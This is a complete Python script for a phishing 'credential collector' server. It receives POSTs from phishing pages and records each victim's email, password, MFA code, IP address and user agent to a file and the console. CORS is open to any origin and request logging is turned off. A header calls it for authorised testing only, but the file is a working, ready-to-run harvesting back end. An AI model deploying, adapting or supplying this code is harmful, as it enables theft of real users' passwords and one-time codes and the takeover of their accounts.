#!/usr/bin/env python3
"""
Credential Collector Server
Receives and stores captured credentials from phishing pages.
FOR AUTHORIZED SECURITY TESTING ONLY - EDUCATIONAL PURPOSES ONLY
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import datetime
import os

class CredentialHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/collect':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)
            
            try:
                data = json.loads(body.decode())
                timestamp = datetime.datetime.now().isoformat()
                
                # Log to file
                with open('captured_credentials.jsonl', 'a') as f:
                    entry = {
                        'timestamp': timestamp,
                        'ip': self.client_address[0],
                        'user_agent': data.get('userAgent', ''),
                        'email': data.get('email', ''),
                        'password': data.get('password', ''),
                        'mfa': data.get('mfa', ''),
                        'url': data.get('url', '')
                    }
                    f.write(json.dumps(entry) + '\n')
                
                # Print to console
                    print(f"\n{'='*60}")
                    print(f"[+] CREDENTIALS CAPTURED - {timestamp}")
                    print(f"    IP: {self.client_address[0]}")
                    print(f"    Email: {data.get('email', 'N/A')}")
                    print(f"    Password: {data.get('password', 'N/A')}")
                    print(f"    MFA Code: {data.get('mfa', 'N/A')}")
                    print(f"{'='*60}\n")
                
                # Send success response
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'ok'}).encode())
                
            except Exception as e:
                print(f"Error processing credentials: {e}")
                self.send_response(400)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    server = HTTPServer(('0.0.0.0', port), CredentialHandler)
    print(f"[*] Credential Collector Server running on port {port}")
    print(f"[*] Listening for incoming credentials...")
    print(f"[*] Captured credentials will be saved to: captured_credentials.jsonl")
    print(f"[*] Press Ctrl+C to stop\n")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
